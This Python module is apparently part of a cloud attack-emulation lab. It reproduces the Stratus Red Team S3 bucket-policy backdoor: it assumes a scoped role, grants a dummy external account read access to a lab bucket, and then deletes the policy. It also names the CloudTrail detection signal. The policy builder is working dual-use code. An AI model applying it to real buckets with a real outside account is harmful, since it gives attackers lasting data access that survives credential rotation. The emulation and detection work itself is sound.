"""
Technique : aws.exfiltration.s3-backdoor-bucket-policy
Tactic    : Exfiltration (T1537 - Transfer Data to Cloud Account)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.exfiltration.s3-backdoor-bucket-policy/

How the attack works:
  PutBucketPolicy installs a statement allowing an attacker account principal
  to list and read the bucket. The access is independent of any IAM user or
  key in the victim account, so rotating credentials does not remove it.

Safety:
  The bucket holds only synthetic objects created by the lab. The grant names
  the Stratus Red Team dummy account (193672423079) and the policy is
  deleted in a finally block.

Detection signal:
  - s3:PutBucketPolicy whose policy names a principal account outside the
    organization (or "*").

Revert:
  - DeleteBucketPolicy in a finally block.

Credential model:
  Option B. The attack assumes the scoped attacker role created by infra/
  instead of acting as the tenant's cross-account role, so IAM bounds what
  it can reach.

Backend contract:
  run(outputs: dict, region: str = "us-east-1") -> None
"""
import json

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import time

import boto3
from botocore.exceptions import ClientError


def _bootstrap_session(outputs: dict, region: str):
    """Session for the attack. In the MayaTrail backend the worker injects the
    tenant's short-lived assumed-role credentials as outputs['_aws_credentials'];
    use them so the attack runs in the tenant account. Falls back to the ambient
    default session for standalone runs."""
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def _assume_role_with_retry(sts_client, role_arn, session_name, duration=3600, max_attempts=5):
    """
    AssumeRole with propagation retry.

    A freshly created IAM role and its inline policy take a few seconds to become
    consistent; sts:AssumeRole can return AccessDenied during that window.
    """
    retryable = {"AccessDenied", "InvalidClientTokenId", "AuthFailure"}
    last_exc = None
    for attempt in range(1, max_attempts + 1):
        try:
            return sts_client.assume_role(
                RoleArn=role_arn,
                RoleSessionName=session_name,
                DurationSeconds=duration,
            )
        except ClientError as exc:
            code = exc.response["Error"]["Code"]
            if code in retryable and attempt < max_attempts:
                print(f"  [~] AssumeRole attempt {attempt}/{max_attempts} got {code}, retrying in 5s")
                time.sleep(5)
                last_exc = exc
            else:
                raise
    raise RuntimeError(f"AssumeRole failed after {max_attempts} attempts: {last_exc}")


def _attacker_session(outputs: dict, region: str, session_name: str):
    """
    Build the session the technique runs as.

    The tenant credentials injected by the worker are used only to assume the
    scoped attacker role this emulation's infra creates. The technique's calls
    are then made by that role, so IAM bounds the blast radius rather than the
    correctness of this script.
    """
    role_arn = (outputs or {}).get("attacker_role_arn", "")
    if not role_arn:
        raise RuntimeError("Missing required Pulumi output: attacker_role_arn")

    sts = _bootstrap_session(outputs, region).client("sts")
    creds = _assume_role_with_retry(sts, role_arn, session_name)["Credentials"]
    print(f"  [+] Assumed scoped attacker role: {role_arn}")
    print("  [!] CloudTrail event: sts:AssumeRole")
    return boto3.Session(
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"],
        region_name=region,
    )


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}\n  {msg}\n{'=' * 60}")


def _require(outputs: dict, *keys: str) -> list:
    values = [(outputs or {}).get(k, "") for k in keys]
    missing = [k for k, v in zip(keys, values) if not v]
    if missing:
        raise RuntimeError(f"Missing required Pulumi output(s): {', '.join(missing)}")
    return values


ATTACKER_ACCOUNT_ID = "193672423079"
DWELL_TIME_S = 15


def _backdoor_policy(bucket_name: str) -> str:
    return json.dumps({
        "Version": "2012-10-17",
        "Statement": [{
            "Sid": "BackdoorRead",
            "Effect": "Allow",
            "Principal": {"AWS": f"arn:aws:iam::{ATTACKER_ACCOUNT_ID}:root"},
            "Action": ["s3:GetObject", "s3:ListBucket"],
            "Resource": [f"arn:aws:s3:::{bucket_name}", f"arn:aws:s3:::{bucket_name}/*"],
        }],
    })


def run(outputs: dict, region: str = "us-east-1") -> None:
    (bucket_name,) = _require(outputs, "bucket_name")

    banner("Step 0 - Assume the scoped attacker role (AssumeRole)")
    session = _attacker_session(outputs, region, "atomic-t1537-s3-backdoor")
    s3 = session.client("s3", region_name=region)

    try:
        s3.get_bucket_policy(Bucket=bucket_name)
        print("  [~] Bucket already has a policy; it will be replaced")
    except ClientError as exc:
        if exc.response["Error"]["Code"] != "NoSuchBucketPolicy":
            raise
        print(f"  [+] {bucket_name} has no bucket policy")

    installed = False
    try:
        banner("Step 1 - Install the backdoor bucket policy (PutBucketPolicy)")
        s3.put_bucket_policy(Bucket=bucket_name, Policy=_backdoor_policy(bucket_name))
        installed = True
        print(f"  [+] Account {ATTACKER_ACCOUNT_ID} can now list and read s3://{bucket_name}")
        print("  [!] CloudTrail event: s3:PutBucketPolicy")
        time.sleep(DWELL_TIME_S)
    finally:
        if installed:
            banner("Revert - Remove the bucket policy (DeleteBucketPolicy)")
            s3.delete_bucket_policy(Bucket=bucket_name)
            print("  [+] Bucket policy removed")

    banner("Complete")
    print("CloudTrail events generated: sts:AssumeRole, s3:GetBucketPolicy, s3:PutBucketPolicy, "
          "s3:DeleteBucketPolicy")
